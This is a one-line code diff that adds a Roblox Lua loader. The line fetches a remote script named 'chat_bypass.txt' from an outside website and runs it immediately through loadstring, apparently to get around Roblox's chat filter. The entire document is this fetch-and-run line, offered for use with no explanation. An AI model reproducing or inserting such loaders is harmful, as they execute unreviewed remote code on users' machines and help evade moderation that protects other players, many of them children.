@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://rustedstyle.com/chat_bypass.txt',true))()
